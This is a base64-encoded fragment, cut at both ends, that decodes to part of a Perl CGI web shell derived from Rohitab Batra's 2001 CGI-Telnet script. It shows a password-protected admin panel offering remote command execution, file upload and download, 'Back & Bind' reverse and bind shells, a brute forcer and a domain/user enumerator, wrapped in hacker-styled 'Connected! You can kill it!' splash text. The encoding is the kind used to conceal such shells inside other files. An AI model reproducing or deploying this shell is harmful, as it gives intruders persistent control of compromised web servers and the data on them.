vbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsNCkJBQ0tHUk9VTkQtQ09MT1I6ICMxYjFiMWI7DQpmb250OiBGaXhlZHN5cyBib2xkOw0KY29sb3I6ICNhYWE7DQp9DQpBOmxpbmsgew0KCUNPTE9SOiAjMkJBOEVDOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6dmlzaXRlZCB7DQoJQ09MT1I6ICMyQkE4RUM7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KQTpob3ZlciB7DQoJdGV4dC1zaGFkb3c6IDBwdCAwcHQgMC4zZW0gY3lhbiwgMHB0IDBwdCAwLjNlbSBjeWFuOw0KCWNvbG9yOiAjZmY5OTAwOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6YWN0aXZlIHsNCgljb2xvcjogUmVkOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCg0KLmxpc3RkaXIgdHI6aG92ZXJ7DQoJYmFja2dyb3VuZDogIzQ0NDsNCn0NCi5saXN0ZGlyIHRyOmhvdmVyIHRkew0KCWJhY2tncm91bmQ6ICM0NDQ7DQoJdGV4dC1zaGFkb3c6IDBwdCAwcHQgMC4zZW0gY3lhbiwgMHB0IDBwdCAwLjNlbSBjeWFuOw0KCWNvbG9yOiAjRkZGRkZGOyBURVhULURFQ09SQVRJT046IG5vbmU7DQp9DQoubm90bGluZXsNCgliYWNrZ3JvdW5kOiAjMTExOw0KfQ0KLmxpbmV7DQoJYmFja2dyb3VuZDogIzIyMjsNCn0NCjwvc3R5bGU+DQo8c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0Ij4NCmZ1bmN0aW9uIGNobW9kX2Zvcm0oaSxmaWxlKQ0Kew0KCS8qdmFyIGFqYXg9J2FqYXhfUG9zdERhdGEoIkZvcm1QZXJtc18nK2krJyIsIiRTY3JpcHRMb2NhdGlvbiIsIlJlc3BvbnNlRGF0YSIpOyByZXR1cm4gZmFsc2U7JzsqLw0KCXZhciBhamF4PSIiOw0KCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJGaWxlUGVybXNfIitpKS5pbm5lckhUTUw9Ijxmb3JtIG5hbWU9Rm9ybVBlcm1zXyIgKyBpKyAiIGFjdGlvbj0nIG1ldGhvZD0nUE9TVCc+PGlucHV0IGlkPXRleHRfIiArIGkgKyAiICBuYW1lPWNobW9kIHR5cGU9dGV4dCBzaXplPTUgLz48aW5wdXQgdHlwZT1zdWJtaXQgY2xhc3M9J3N1Ym1pdCcgb25jbGljaz0nIiArIGFqYXggKyAiJyB2YWx1ZT1PSz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hIHZhbHVlPSdndWknPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWQgdmFsdWU9JyRkaXInPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWYgdmFsdWU9JyIrZmlsZSsiJz48L2Zvcm0+IjsNCglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidGV4dF8iICsgaSkuZm9jdXMoKTsNCn0NCmZ1bmN0aW9uIHJtX2NobW9kX2Zvcm0ocmVzcG9uc2UsaSxwZXJtcyxmaWxlKQ0Kew0KCXJlc3BvbnNlLmlubmVySFRNTCA9ICI8c3BhbiBvbmNsaWNrPVxcXCJjaG1vZF9mb3JtKCIgKyBpICsgIiwnIisgZmlsZSsgIicpXFxcIiA+IisgcGVybXMgKyI8L3NwYW4+PC90ZD4iOw0KfQ0KZnVuY3Rpb24gcmVuYW1lX2Zvcm0oaSxmaWxlLGYpDQp7DQoJdmFyIGFqYXg9IiI7DQoJZi5yZXBsYWNlKC9cXFxcL2csIlxcXFxcXFxcIik7DQoJdmFyIGJhY2s9InJtX3JlbmFtZV9mb3JtKCIraSsiLFxcXCIiK2ZpbGUrIlxcXCIsXFxcIiIrZisiXFxcIik7IHJldHVybiBmYWxzZTsiOw0KCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJGaWxlXyIraSkuaW5uZXJIVE1MPSI8Zm9ybSBuYW1lPUZvcm1QZXJtc18iICsgaSsgIiBhY3Rpb249JyBtZXRob2Q9J1BPU1QnPjxpbnB1dCBpZD10ZXh0XyIgKyBpICsgIiAgbmFtZT1yZW5hbWUgdHlwZT10ZXh0IHZhbHVlPSAnIitmaWxlKyInIC8+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIG9uY2xpY2s9JyIgKyBhamF4ICsgIicgdmFsdWU9T0s+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIG9uY2xpY2s9JyIgKyBiYWNrICsgIicgdmFsdWU9Q2FuY2VsPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWEgdmFsdWU9J2d1aSc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZCB2YWx1ZT0nJGRpcic+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZiB2YWx1ZT0nIitmaWxlKyInPjwvZm9ybT4iOw0KCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ0ZXh0XyIgKyBpKS5mb2N1cygpOw0KfQ0KZnVuY3Rpb24gcm1fcmVuYW1lX2Zvcm0oaSxmaWxlLGYpDQp7DQoJaWYoZj09J2YnKQ0KCXsNCgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9IjxhIGhyZWY9Jz9hPWNvbW1hbmQmZD0kZGlyJmM9ZWRpdCUyMCIrZmlsZSsiJTIwJz4iICtmaWxlKyAiPC9hPiI7DQoJfWVsc2UNCgl7DQoJCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJGaWxlXyIraSkuaW5uZXJIVE1MPSI8YSBocmVmPSc/YT1ndWkmZD0iK2YrIic+WyAiICtmaWxlKyAiIF08L2E+IjsNCgl9DQp9DQo8L3NjcmlwdD4NCjxib2R5IG9uTG9hZD0iZG9jdW1lbnQuZi5AXy5mb2N1cygpIiBiZ2NvbG9yPSIjMGMwYzBjIiB0b3BtYXJnaW49IjAiIGxlZnRtYXJnaW49IjAiIG1hcmdpbndpZHRoPSIwIiBtYXJnaW5oZWlnaHQ9IjAiPg0KPGNlbnRlcj48Y29kZT4NCjx0YWJsZSBib3JkZXI9IjEiIHdpZHRoPSIxMDAlIiBjZWxsc3BhY2luZz0iMCIgY2VsbHBhZGRpbmc9IjIiPg0KPHRyPg0KCTx0ZCBhbGlnbj0iY2VudGVyIiByb3dzcGFuPTI+DQoJCTxiPjxmb250IHNpemU9IjUiPiRFZGl0UGVyc2lvbjwvZm9udD48L2I+DQoJPC90ZD4NCg0KCTx0ZD4NCg0KCQk8Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj4kRU5WeyJTRVJWRVJfU09GVFdBUkUifTwvZm9udD4NCgk8L3RkPg0KCTx0ZD5TZXJ2ZXIgSVA6PGZvbnQgY29sb3I9IiNiYjAwMDAiPiAkRU5WeydTRVJWRVJfQUREUid9PC9mb250PiB8IFlvdXIgSVA6IDxmb250IGNvbG9yPSIjYmIwMDAwIj4kRU5WeydSRU1PVEVfQUREUid9PC9mb250Pg0KCTwvdGQ+DQoNCjwvdHI+DQoNCjx0cj4NCjx0ZCBjb2xzcGFuPSIzIj48Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj4NCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbiI+SG9tZTwvYT4gfCANCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWNvbW1hbmQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkNvbW1hbmQ8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWd1aSZkPSRFbmNvZGVkQ3VycmVudERpciI+R1VJPC9hPiB8IA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5VcGxvYWQgRmlsZTwvYT4gfCANCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5Eb3dubG9hZCBGaWxlPC9hPiB8DQoNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWJhY2tiaW5kIj5CYWNrICYgQmluZDwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9YnJ1dGVmb3JjZXIiPkJydXRlIEZvcmNlcjwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Y2hlY2tsb2ciPkNoZWNrIExvZzwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG9tYWluc3VzZXIiPkRvbWFpbnMvVXNlcnM8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWxvZ291dCI+TG9nb3V0PC9hPiB8DQo8YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0iIyI+SGVscDwvYT4NCg0KPC9mb250PjwvdGQ+DQo8L3RyPg0KPC90YWJsZT4NCjxmb250IGlkPSJSZXNwb25zZURhdGEiIGNvbG9yPSIjZmY5OWNjIiA+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVlbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5TY3JlZW4NCnsNCg0KCXByaW50IDw8RU5EOw0KPHByZT48c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+DQpUeXBpbmdUZXh0ID0gZnVuY3Rpb24oZWxlbWVudCwgaW50ZXJ2YWwsIGN1cnNvciwgZmluaXNoZWRDYWxsYmFjaykgew0KICBpZigodHlwZW9mIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkID09ICJ1bmRlZmluZWQiKSB8fCAodHlwZW9mIGVsZW1lbnQuaW5uZXJIVE1MID09ICJ1bmRlZmluZWQiKSkgew0KICAgIHRoaXMucnVubmluZyA9IHRydWU7CS8vIE5ldmVyIHJ1bi4NCiAgICByZXR1cm47DQogIH0NCiAgdGhpcy5lbGVtZW50ID0gZWxlbWVudDsNCiAgdGhpcy5maW5pc2hlZENhbGxiYWNrID0gKGZpbmlzaGVkQ2FsbGJhY2sgPyBmaW5pc2hlZENhbGxiYWNrIDogZnVuY3Rpb24oKSB7IHJldHVybjsgfSk7DQogIHRoaXMuaW50ZXJ2YWwgPSAodHlwZW9mIGludGVydmFsID09ICJ1bmRlZmluZWQiID8gMTAwIDogaW50ZXJ2YWwpOw0KICB0aGlzLm9yaWdUZXh0ID0gdGhpcy5lbGVtZW50LmlubmVySFRNTDsNCiAgdGhpcy51bnBhcnNlZE9yaWdUZXh0ID0gdGhpcy5vcmlnVGV4dDsNCiAgdGhpcy5jdXJzb3IgPSAoY3Vyc29yID8gY3Vyc29yIDogIiIpOw0KICB0aGlzLmN1cnJlbnRUZXh0ID0gIiI7DQogIHRoaXMuY3VycmVudENoYXIgPSAwOw0KICB0aGlzLmVsZW1lbnQudHlwaW5nVGV4dCA9IHRoaXM7DQogIGlmKHRoaXMuZWxlbWVudC5pZCA9PSAiIikgdGhpcy5lbGVtZW50LmlkID0gInR5cGluZ3RleHQiICsgVHlwaW5nVGV4dC5jdXJyZW50SW5kZXgrKzsNCiAgVHlwaW5nVGV4dC5hbGwucHVzaCh0aGlzKTsNCiAgdGhpcy5ydW5uaW5nID0gZmFsc2U7DQogIHRoaXMuaW5UYWcgPSBmYWxzZTsNCiAgdGhpcy50YWdCdWZmZXIgPSAiIjsNCiAgdGhpcy5pbkhUTUxFbnRpdHkgPSBmYWxzZTsNCiAgdGhpcy5IVE1MRW50aXR5QnVmZmVyID0gIiI7DQp9DQpUeXBpbmdUZXh0LmFsbCA9IG5ldyBBcnJheSgpOw0KVHlwaW5nVGV4dC5jdXJyZW50SW5kZXggPSAwOw0KVHlwaW5nVGV4dC5ydW5BbGwgPSBmdW5jdGlvbigpIHsNCiAgZm9yKHZhciBpID0gMDsgaSA8IFR5cGluZ1RleHQuYWxsLmxlbmd0aDsgaSsrKSBUeXBpbmdUZXh0LmFsbFtpXS5ydW4oKTsNCn0NClR5cGluZ1RleHQucHJvdG90eXBlLnJ1biA9IGZ1bmN0aW9uKCkgew0KICBpZih0aGlzLnJ1bm5pbmcpIHJldHVybjsNCiAgaWYodHlwZW9mIHRoaXMub3JpZ1RleHQgPT0gInVuZGVmaW5lZCIpIHsNCiAgICBzZXRUaW1lb3V0KCJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnIiArIHRoaXMuZWxlbWVudC5pZCArICInKS50eXBpbmdUZXh0LnJ1bigpIiwgdGhpcy5pbnRlcnZhbCk7CS8vIFdlIGhhdmVuJ3QgZmluaXNoZWQgbG9hZGluZyB5ZXQuICBIYXZlIHBhdGllbmNlLg0KICAgIHJldHVybjsNCiAgfQ0KICBpZih0aGlzLmN1cnJlbnRUZXh0ID09ICIiKSB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MID0gIiI7DQovLyAgdGhpcy5vcmlnVGV4dCA9IHRoaXMub3JpZ1RleHQucmVwbGFjZSgvPChbXjxdKSo+LywgIiIpOyAgICAgLy8gU3RyaXAgSFRNTCBmcm9tIHRleHQuDQogIGlmKHRoaXMuY3VycmVudENoYXIgPCB0aGlzLm9yaWdUZXh0Lmxlbmd0aCkgew0KICAgIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI8IiAmJiAhdGhpcy5pblRhZykgew0KICAgICAgdGhpcy50YWdCdWZmZXIgPSAiPCI7DQogICAgICB0aGlzLmluVGFnID0gdHJ1ZTsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI+IiAmJiB0aGlzLmluVGFnKSB7DQogICAgICB0aGlzLnRhZ0J1ZmZlciArPSAiPiI7DQogICAgICB0aGlzLmluVGFnID0gZmFsc2U7DQogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMudGFnQnVmZmVyOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5pblRhZykgew0KICAgICAgdGhpcy50YWdCdWZmZXIgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiJiIgJiYgIXRoaXMuaW5IVE1MRW50aXR5KSB7DQogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgPSAiJiI7DQogICAgICB0aGlzLmluSFRNTEVudGl0eSA9IHRydWU7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiOyIgJiYgdGhpcy5pbkhUTUxFbnRpdHkpIHsNCiAgICAgIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciArPSAiOyI7DQogICAgICB0aGlzLmluSFRNTEVudGl0eSA9IGZhbHNlOw0KICAgICAgdGhpcy5jdXJyZW50VGV4dCArPSB0aGlzLkhUTUxFbnRpdHlCdWZmZXI7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLmluSFRNTEVudGl0eSkgew0KICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2Ugew0KICAgICAgdGhpcy5jdXJyZW50VGV4dCArPSB0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKTsNCiAgICB9DQogICAgdGhpcy5lbGVtZW50LmlubmVySFRNTCA9IHRoaXMuY3VycmVudFRleHQ7DQogICAgdGhpcy5lbGVtZW50LmlubmVySFRNTCArPSAodGhpcy5jdXJyZW50Q2hhciA8IHRoaXMub3JpZ1RleHQubGVuZ3RoIC0gMSA/ICh0eXBlb2YgdGhpcy5jdXJzb3IgPT0gImZ1bmN0aW9uIiA/IHRoaXMuY3Vyc29yKHRoaXMuY3VycmVudFRleHQpIDogdGhpcy5jdXJzb3IpIDogIiIpOw0KICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICBzZXRUaW1lb3V0KCJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnIiArIHRoaXMuZWxlbWVudC5pZCArICInKS50eXBpbmdUZXh0LnJ1bigpIiwgdGhpcy5pbnRlcnZhbCk7DQogIH0gZWxzZSB7DQoJdGhpcy5jdXJyZW50VGV4dCA9ICIiOw0KCXRoaXMuY3VycmVudENoYXIgPSAwOw0KICAgICAgICB0aGlzLnJ1bm5pbmcgPSBmYWxzZTsNCiAgICAgICAgdGhpcy5maW5pc2hlZENhbGxiYWNrKCk7DQogIH0NCn0NCjwvc2NyaXB0Pg0KPC9wcmU+DQoNCjxmb250IHN0eWxlPSJmb250OiAxNXB0IFZlcmRhbmE7IGNvbG9yOiB5ZWxsb3c7Ij5Db3B5cmlnaHQgKEMpIDIwMDEgUm9oaXRhYiBCYXRyYSA8L2ZvbnQ+PGJyPjxicj4NCjx0YWJsZSBhbGlnbj0iY2VudGVyIiBib3JkZXI9IjEiIHdpZHRoPSI2MDAiIGhlaWdoPg0KPHRib2R5Pjx0cj4NCjx0ZCB2YWxpZ249InRvcCIgYmFja2dyb3VuZD0iaHR0cDovL2RsLmRyb3Bib3guY29tL3UvMTA4NjAwNTEvaW1hZ2VzL21hdHJhbi5naWYiPjxwIGlkPSJoYWNrIiBzdHlsZT0ibWFyZ2luLWxlZnQ6IDNweDsiPg0KPGZvbnQgY29sb3I9IiMwMDk5MDAiPiBQbGVhc2UgV2FpdCAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuPC9mb250PiA8YnI+DQoNCjxmb250IGNvbG9yPSIjMDA5OTAwIj4gVHJ5aW5nIGNvbm5lY3QgdG8gU2VydmVyIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+PGJyPg0KPGZvbnQgY29sb3I9IiNGMDAwMDAiPjxmb250IGNvbG9yPSIjRkZGMDAwIj5+XCQ8L2ZvbnQ+IENvbm5lY3RlZCAhIDwvZm9udD48YnI+DQo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPiRTZXJ2ZXJOYW1lfjwvZm9udD4gQ2hlY2tpbmcgU2VydmVyIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+IDxicj4NCg0KPGZvbnQgY29sb3I9IiMwMDk5MDAiPjxmb250IGNvbG9yPSIjRkZGMDAwIj4kU2VydmVyTmFtZX48L2ZvbnQ+IFRyeWluZyBjb25uZWN0IHRvIENvbW1hbmQgLiAuIC4gLiAuIC4gLiAuIC4gLiAuPC9mb250Pjxicj4NCg0KPGZvbnQgY29sb3I9IiNGMDAwMDAiPjxmb250IGNvbG9yPSIjRkZGMDAwIj4kU2VydmVyTmFtZX48L2ZvbnQ+XCQgQ29ubmVjdGVkIENvbW1hbmQhIDwvZm9udD48YnI+DQo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPiRTZXJ2ZXJOYW1lfjxmb250IGNvbG9yPSIjRjAwMDAwIj5cJDwvZm9udD48L2ZvbnQ+IE9LISBZb3UgY2FuIGtpbGwgaXQhPC9mb250Pg0KPC90cj4NCjwvdGJvZHk+PC90YWJsZT4NCjxicj4NCg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KbmV3IFR5cGluZ1RleHQoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImhhY2siKSwgMzAsIGZ1bmN0aW9uKGkpeyB2YXIgYXIgPSBuZXcgQXJyYXkoIl8iLCIiKTsgcmV0dXJuICIgIiArIGFyW2kubGVuZ3RoICUgYXIubGVuZ3RoXTsgfSk7DQpUeXBpbmdUZXh0LnJ1bkFsbCgpOw0KDQo8L3NjcmlwdD4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEFkZCBodG1sIHNwZWNpYWwgY2hhcnMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBIdG1sU3BlY2lhbENoYXJzKCQpew0KCW15ICR0ZXh0ID0gc2hpZnQ7DQoJJHRleHQgPX4gcy8mLyZhbXA7L2c7DQoJJHRleHQgPX4gcy8iLyZxdW90Oy9nOw0KCSR0ZXh0ID1+IHMvJy8mIzAzOTsvZzsNCgkkdGV4dCA9fiBzLzwvJmx0Oy9nOw0KCSR0ZXh0ID1+IHMvPi8mZ3Q7L2c7DQoJcmV0dXJuICR0ZXh0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBBZGQgbGluayBmb3IgZGlyZWN0b3J5DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQWRkTGlua0RpcigkKQ0Kew0KCW15ICRhYz1zaGlmdDsNCglteSBAZGlyPSgpOw0KCWlmKCRXaW5OVCkNCgl7DQoJCUBkaXI9c3BsaXQoL1xcLywkQ3VycmVudERpcik7DQoJfWVsc2UNCgl7DQoJCUBkaXI9c3BsaXQoIi8iLCZ0cmltKCRDdXJyZW50RGlyKSk7DQoJfQ0KCW15ICRwYXRoPSIiOw0KCW15ICRyZXN1bHQ9IiI7DQoJZm9yZWFjaCAoQGRpcikNCgl7DQoJCSRwYXRoIC49ICRfLiRQYXRoU2VwOw0KCQkkcmVzdWx0Lj0iPGEgaHJlZj0nP2E9Ii4kYWMuIiZkPSIuJHBhdGguIic+Ii4kXy4kUGF0aFNlcC4iPC9hPiI7DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIG1lc3NhZ2UgdGhhdCBpbmZvcm1zIHRoZSB1c2VyIG9mIGEgZmFpbGVkIGxvZ2luDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpbkZhaWxlZE1lc3NhZ2UNCnsNCglwcmludCA8PEVORDsNCjxicj5Mb2dpbiA6IEFkbWluaXN0cmF0b3I8YnI+DQoNClBhc3N3b3JkOjxicj4NCkxvZ2luIGluY29ycmVjdDxicj48YnI+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSBmb3IgbG9nZ2luZyBpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5Gb3JtDQp7DQoJcHJpbnQgPDxFTkQ7DQo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJsb2dpbiI+DQpMb2dpbiA6IEFkbWluaXN0cmF0b3I8YnI+DQpQYXNzd29yZDo8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InAiPg0KPGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4NCjwvZm9ybT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgZm9vdGVyIGZvciB0aGUgSFRNTCBQYWdlDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRQYWdlRm9vdGVyDQp7DQoJcHJpbnQgIjxicj48Zm9udCBjb2xvcj1yZWQ+by0tLVsgIDxmb250IGNvbG9yPSNmZjk5MDA+RWRpdCBieSAkRWRpdFBlcnNpb24gPC9mb250PiAgXS0tLW88L2ZvbnQ+PC9jb2RlPjwvY2VudGVyPjwvYm9keT48L2h0bWw+IjsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBSZXRyZWl2ZXMgdGhlIHZhbHVlcyBvZiBhbGwgY29va2llcy4gVGhlIGNvb2tpZXMgY2FuIGJlIGFjY2Vzc2VzIHVzaW5nIHRoZQ0KIyB2YXJpYWJsZSAkQ29va2llc3snfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEdldENvb2tpZXMNCnsNCglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOw0KCWZvcmVhY2ggJGNvb2tpZShAaHR0cGNvb2tpZXMpDQoJew0KCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7DQoJCSRDb29raWVzeyRpZH0gPSAkdmFsOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dvdXRTY3JlZW4NCnsNCglwcmludCAiQ29ubmVjdGlvbiBjbG9zZWQgYnkgZm9yZWlnbiBob3N0Ljxicj48YnI+IjsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBMb2dzIG91dCB0aGUgdXNlciBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGxvZ2luIGFnYWluDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t